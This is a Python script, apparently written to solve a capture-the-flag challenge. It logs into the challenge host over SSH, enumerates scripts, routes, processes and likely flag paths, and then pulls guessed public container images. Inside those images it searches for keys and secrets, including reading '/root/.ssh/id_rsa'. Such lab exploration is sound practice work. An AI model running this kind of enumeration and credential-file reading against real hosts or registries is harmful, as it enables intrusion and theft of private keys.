#!/usr/bin/env python3
"""
Phase 2: Deep investigation + GHCR pull
"""

import paramiko
import subprocess
import time

HOST = "instance.ctf.tdho.st"
PORT = 32881
USERNAME = "player"
PASSWORD = "reyalp"

def ssh_connect():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
    return client

def exec_cmd(client, cmd, timeout=30):
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode()
        err = stderr.read().decode()
        return out + err
    except Exception as e:
        return f"Error: {e}"

def main():
    print("[*] Phase 2: Deep Investigation")
    
    client = ssh_connect()
    print("[+] Connected")
    
    # 1. Check what sync-loop.sh does
    print("\n[*] Checking sync-loop.sh...")
    out = exec_cmd(client, "cat /opt/mc/scripts/sync-loop.sh 2>/dev/null")
    print(out[:1000])
    
    # 2. Check entrypoint.sh
    print("\n[*] Checking entrypoint.sh...")
    out = exec_cmd(client, "cat /entrypoint.sh 2>/dev/null")
    print(out[:1000])
    
    # 3. Find network gateway properly
    print("\n[*] Finding gateway...")
    out = exec_cmd(client, "cat /proc/net/route | awk '{print $1,$2,$3}' | grep -v Iface")
    print(out)
    
    out = exec_cmd(client, "netstat -rn 2>/dev/null || route -n 2>/dev/null")
    print(out)
    
    # 4. Check .sync directory more carefully
    print("\n[*] Checking .sync directory...")
    out = exec_cmd(client, "ls -la /opt/mc/.sync/ 2>&1")
    print(out)
    
    out = exec_cmd(client, "cat /opt/mc/.sync/pwn 2>/dev/null")
    print(f"PWN file content: {out}")
    
    # 5. Try to read flag after sync trigger
    print("\n[*] Waiting for sync-loop to process...")
    time.sleep(5)
    
    out = exec_cmd(client, "cat /opt/mc/.sync/* 2>/dev/null")
    print(f"Sync directory contents: {out}")
    
    # 6. Check if flag appeared anywhere
    print("\n[*] Searching for flag...")
    locations = [
        "/etc/flag.txt",
        "/flag.txt",
        "/tmp/flag.txt",
        "/opt/mc/flag.txt",
        "/opt/mc/.sync/flag",
        "/opt/mc/logs/latest.log"
    ]
    
    for loc in locations:
        out = exec_cmd(client, f"cat {loc} 2>/dev/null")
        if out and "TDHT{" in out:
            print(f"\n🚩 FLAG FOUND at {loc}:")
            print(out)
            return
        elif out:
            print(f"{loc}: {out[:100]}")
    
    # 7. Check processes more carefully
    print("\n[*] Process details...")
    out = exec_cmd(client, "ps auxww | grep -E 'root|sync'")
    print(out)
    
    # 8. Try to see what root can see
    print("\n[*] Checking root-owned files...")
    out = exec_cmd(client, "find / -user root -name '*flag*' 2>/dev/null")
    print(out)
    
    client.close()
    
    # NOW: Try to access GHCR image
    print("\n" + "="*60)
    print("[*] Attempting to pull GHCR image...")
    print("="*60)
    
    image_names = [
        "talldwarfhosting/mc-server",
        "talldwarfhosting/minecraft-server", 
        "talldwarfhosting/game-server",
        "talldwarfhosting/stolen-schematics",
        "talldwarfhosting/ctf-server"
    ]
    
    for img in image_names:
        print(f"\n[*] Trying: ghcr.io/{img}")
        
        # Try to list tags
        cmd = f'curl -s -L https://ghcr.io/v2/{img}/tags/list'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        
        if "tags" in result.stdout and "errors" not in result.stdout:
            print(f"  [✓] FOUND PUBLIC IMAGE: {img}")
            print(f"  Tags: {result.stdout}")
            
            # Try to pull it
            print(f"  [*] Attempting to pull...")
            pull_cmd = f'docker pull ghcr.io/{img}:latest 2>&1 || docker pull ghcr.io/{img}:v1 2>&1'
            pull_result = subprocess.run(pull_cmd, shell=True, capture_output=True, text=True, timeout=60)
            print(pull_result.stdout[:500])
            
            if "Downloaded" in pull_result.stdout or "up to date" in pull_result.stdout:
                # Search for secrets in the image
                print(f"  [*] Searching for secrets...")
                search_cmds = [
                    f'docker run --rm ghcr.io/{img}:latest find / -name "*key*" -o -name "*secret*" 2>/dev/null',
                    f'docker run --rm ghcr.io/{img}:latest cat /root/.ssh/id_rsa 2>/dev/null',
                    f'docker run --rm ghcr.io/{img}:latest cat /etc/flag.txt 2>/dev/null',
                    f'docker run --rm ghcr.io/{img}:latest grep -r "TDHT{{" / 2>/dev/null'
                ]
                
                for scmd in search_cmds:
                    sr = subprocess.run(scmd, shell=True, capture_output=True, text=True, timeout=30)
                    if sr.stdout:
                        print(f"    Found: {sr.stdout[:300]}")

if __name__ == "__main__":
    main()
